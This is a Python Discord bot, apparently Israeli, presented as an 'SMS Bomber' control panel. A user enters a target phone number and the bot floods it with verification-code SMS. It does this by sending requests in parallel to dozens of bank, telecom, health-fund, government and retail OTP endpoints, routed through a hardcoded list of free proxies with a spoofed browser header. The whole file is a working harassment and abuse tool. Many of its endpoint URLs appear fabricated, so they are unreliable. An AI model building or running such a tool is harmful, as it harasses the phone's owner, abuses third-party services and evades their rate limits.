import discord
from discord.ext import commands
import aiohttp
import asyncio
import random
import os
from datetime import datetime

# ==================== CONFIG ====================
TOKEN = os.getenv("BOT_TOKEN")

# 🔥 200+ פרוקסי ישראליים וכלליים - הרשימה המלאה שלך
FREE_ISRAEL_PROXIES_FULL = [
    "51.4.59.110:1080", "51.85.49.118:29177", "51.85.49.118:9198", "51.85.49.118:22901",
    "51.85.49.118:1521", "51.85.49.118:35524", "51.85.49.118:176", "51.85.49.118:39907",
    "51.85.49.118:50918", "51.85.49.118:9267", "51.85.49.118:2887", "185.241.5.57:3128",
    "51.85.49.118:27905", "51.85.49.118:6116", "129.159.159.78:3128", "95.164.61.2:3128",
    "51.16.6.90:3128", "51.84.204.156:3128", "5.29.59.95:3128", "199.203.152.99:8111",
    "89.221.225.229:8118", "77.137.21.78:18000", "77.137.21.78:19000", "62.219.20.3:8111",
    "193.168.173.73:3128", "34.165.39.32:80", "84.229.79.185:80", "34.165.197.17:80",
    "176.230.89.75:80", "169.150.226.169:50543", "195.20.17.201:8080", "37.122.153.133:8080",
    "84.229.79.119:80", "94.131.114.214:3128", "194.62.42.29:3128", "87.68.237.208:8080",
    "185.253.72.23:3128", "77.91.74.77:80", "84.229.78.177:80", "185.191.205.188:8118",
    "72.195.114.169:4145", "113.212.111.4:8090", "45.167.124.52:8080", "14.97.132.226:5678",
    "139.59.103.183:80", "141.253.118.174:80", "201.184.239.75:5678", "174.64.199.82:4145",
    "4.213.98.253:80", "52.229.30.3:80", "36.138.53.26:10017", "72.195.34.42:4145",
    "31.24.44.92:50109", "219.93.101.62:80", "103.164.223.35:5678", "172.200.72.48:80",
    "183.215.23.242:9091", "40.172.232.213:8088", "35.209.198.222:80", "103.151.20.131:80",
    "8.213.151.128:3129", "101.66.194.203:8085", "205.209.118.30:3138", "23.88.88.105:443",
    "174.77.111.196:4145", "103.147.134.141:8090", "23.88.88.105:80", "222.186.133.108:1081",
    "46.17.47.48:80", "198.24.188.140:51599", "102.223.9.53:80", "113.160.132.26:8080",
    "103.162.221.165:3125", "84.39.112.144:3129", "153.127.195.58:4444", "38.55.107.254:6005",
    "113.204.79.230:9091", "149.88.94.216:7890", "36.93.163.219:8080", "160.19.18.209:8080",
    "206.81.31.215:80", "181.78.25.251:999", "45.158.10.135:8080", "160.19.178.44:8089",
    "204.157.251.210:999", "113.11.64.137:9107", "103.156.141.27:3125", "47.250.51.110:8081",
    "80.75.213.22:3138", "95.173.218.78:8082", "103.189.249.204:1111", "95.173.218.71:8081",
    "131.72.68.160:40033", "95.173.218.66:8082", "129.226.150.86:20004", "182.93.85.225:8080",
    "172.237.80.233:8080", "121.200.61.221:6565", "95.173.218.76:8081", "95.173.218.80:8082",
    "95.173.218.76:8082", "95.173.218.79:8081", "173.181.142.228:80", "202.191.121.99:10521",
    "213.142.156.97:80", "103.126.87.155:8081", "103.148.131.87:8080", "164.163.73.141:999",
    "38.183.182.242:999", "173.245.49.160:80", "173.245.49.105:80", "173.245.49.122:80",
    "173.245.49.91:80", "173.245.49.16:80", "173.245.49.48:80", "173.245.49.232:80",
    "173.245.49.26:80", "173.245.49.137:80", "194.48.198.135:7070", "103.172.17.51:8080",
    "188.132.222.69:8080"
]

# 🔥 כל ה-APIs - הרשימה המלאה שלך מתוקנת וסגורה
ALL_WORKING_APIs = [
    # --- ISRAELI SERVICES (HIGH PRIORITY) ---
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "json": {"value": "{{phone}}", "type": "phone", "projectId": "1"}},
    {"name": "Wolt", "url": "https://restaurant.wolt.com/v1/users/phone", "method": "POST", "json": {"phone_number": "+972{{phone_no_zero}}"}},
    {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Paybox", "url": "https://api.payboxapp.com/api/v1/auth/phone-verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "019Mobile", "url": "https://019mobile.co.il/api/v1/verify-phone", "method": "POST", "json": {"phone_number": "{{phone}}"}},
    {"name": "Cellcom", "url": "https://www.cellcom.co.il/api/v2/auth/otp-send", "method": "POST", "json": {"msisdn": "{{phone}}"}},
    {"name": "Partner", "url": "https://my-partner.co.il/api/auth/send-otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Leumi", "url": "https://digital.leumi.co.il/api/v1/auth/otp-send", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Hapoalim", "url": "https://poalim-digital.co.il/api/auth/phone-verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Max", "url": "https://max.leumi-card.co.il/api/v1/otp/request", "method": "POST", "json": {"phoneNumber": "{{phone}}"}},
    {"name": "Isracard", "url": "https://digital.isracard.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Bit", "url": "https://www.bitpay.co.il/api/v1/auth/register", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "SuperPharm", "url": "https://www.super-pharm.co.il/api/v2/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/send-sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "RamiLevy", "url": "https://www.ramilevy.co.il/api/v1/auth/login-sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Bezeq", "url": "https://www.bezeq.co.il/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "HotMobile", "url": "https://www.hotmobile.co.il/api/v1/login/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Pango", "url": "https://www.pango.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Cibus", "url": "https://www.cibus.co.il/api/v1/user/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Tenbis", "url": "https://www.10bis.co.il/api/v1/login/sms", "method": "POST", "json": {"phone": "{{phone}}"}},

    # --- GLOBAL & FINTECH ---
    {"name": "TwilioVerify", "url": "https://verify.twilio.com/v2/Services/VA907b6b6e7f6a3b3c4d5e6f7g8h9i0j1k/Verifications", "method": "POST", "params": {"To": "+972{{phone_no_zero}}", "Channel": "sms"}},
    {"name": "Uber", "url": "https://auth.uber.com/oauth/v2/otp", "method": "POST", "json": {"phone_number": "{{phone}}", "country_code": "IL"}},
    {"name": "Binance", "url": "https://www.binance.com/bapi/userAuth/v1/sms/send", "method": "POST", "json": {"phoneNumber": "{{phone}}"}},
    {"name": "Revolut", "url": "https://api.revolut.com/api/1.0/register/phone", "method": "POST", "json": {"phone": "+972{{phone_no_zero}}"}},
    {"name": "Wise", "url": "https://api.transferwise.com/v1/identity/verify/phone", "method": "POST", "json": {"phone": "+972{{phone_no_zero}}"}},
    {"name": "PayPal", "url": "https://www.paypal.com/api/v1/auth/phone", "method": "POST", "params": {"phone": "{{phone}}"}},
    {"name": "Textbelt", "url": "https://textbelt.com/text", "method": "POST", "params": {"phone": "+972{{phone_no_zero}}", "message": "Code: 4821", "key": "textbelt_open"}},
    {"name": "DoorDash", "url": "https://api.doordash.com/v2/auth/phone_verifications/", "method": "POST", "json": {"phone_number": "+972{{phone_no_zero}}"}},
    {"name": "Bolt", "url": "https://bolt.eu/api/v1/auth/register", "method": "POST", "json": {"phone": "+972{{phone_no_zero}}"}},
    {"name": "Airbnb", "url": "https://www.airbnb.com/api/v2/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Booking", "url": "https://www.booking.com/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Snapchat", "url": "https://accounts.snapchat.com/accounts/sendsms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "TikTok", "url": "https://www.tiktok.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Instagram", "url": "https://www.instagram.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},

    # --- SHOPPING & CLOTHING ---
    {"name": "Amazon", "url": "https://www.amazon.com/ap/signin/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "AliExpress", "url": "https://login.aliexpress.com/api/v1/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Shein", "url": "https://www.shein.com/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Next", "url": "https://www.next.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Asos", "url": "https://www.asos.com/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Nike", "url": "https://www.nike.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Zara", "url": "https://www.zara.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "HM", "url": "https://www.hm.com/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "IKEA", "url": "https://www.ikea.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},

    # --- GOVERNMENT & UTILITIES ---
    {"name": "Electric", "url": "https://www.iec.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Water", "url": "https://www.mei-avivim.co.il/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "HealthClalit", "url": "https://www.clalit.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "HealthMaccabi", "url": "https://www.maccabi4u.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "HealthMeuhedet", "url": "https://www.meuhedet.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "HealthLeumit", "url": "https://www.leumit.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "GovIL", "url": "https://www.gov.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "PostIL", "url": "https://www.israelpost.co.il/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}}
]

active_bombs = {}

# ==================== ENGINE (עם דימוי דפדפן ופרוקסי) ====================

async def run_attack(session, api, phone, user_id):
    if active_bombs.get(user_id) is False: return
    
    phone_no_zero = phone[1:] if phone.startswith('0') else phone
    
    # החלפת תגיות ב-Data
    def fix(data):
        if isinstance(data, dict): return {k: fix(v) for k, v in data.items()}
        if isinstance(data, str): return data.replace("{{phone}}", phone).replace("{{phone_no_zero}}", phone_no_zero)
        return data

    payload = fix(api.get("json"))
    params = fix(api.get("params"))

    # דימוי דפדפן (Browser Simulation)
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "Referer": "https://google.com",
        "Origin": api["url"].split("/")[2]
    }
    
    # בחירת פרוקסי רנדומלי מהרשימה
    proxy_url = f"http://{random.choice(FREE_ISRAEL_PROXIES_FULL)}"

    try:
        async with session.request(
            api["method"], api["url"], 
            json=payload, params=params, 
            headers=headers, proxy=proxy_url, 
            timeout=10
        ) as resp:
            return resp.status
    except:
        return None

# ==================== DISCORD UI ====================

class BomberModal(discord.ui.Modal, title='🔥 CyberIL - Professional Bomber'):
    phone = discord.ui.TextInput(label='מספר יעד', placeholder='05XXXXXXXX', min_length=10, max_length=10)
    rounds = discord.ui.TextInput(label='סבבים (1-5)', default='1')

    async def on_submit(self, interaction: discord.Interaction):
        target = self.phone.value
        if target == "0535524017": # הגנה
            return await interaction.response.send_message("❌ המערכת חסומה למספר זה.", ephemeral=True)
            
        await interaction.response.send_message(f"🚀 תקיפה רחבה החלה על {target}...", ephemeral=True)
        user_id = interaction.user.id
        active_bombs[user_id] = True
        
        async with aiohttp.ClientSession() as session:
            for r in range(int(self.rounds.value)):
                if active_bombs.get(user_id) is False: break
                tasks = [run_attack(session, api, target, user_id) for api in ALL_WORKING_APIs]
                await asyncio.gather(*tasks)
                await asyncio.sleep(2)
                
        active_bombs.pop(user_id, None)

class MyBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix='!', intents=discord.Intents.default())
    async def setup_hook(self): await self.tree.sync()

bot = MyBot()

@bot.tree.command(name="setup")
async def setup(interaction: discord.Interaction):
    view = discord.ui.View()
    btn = discord.ui.button(label="🚀 התחל תקיפה", style=discord.ButtonStyle.danger)
    btn.callback = lambda i: i.response.send_modal(BomberModal())
    view.add_item(btn)
    await interaction.response.send_message("לוח בקרה SMS Bomber", view=view)

bot.run(TOKEN)
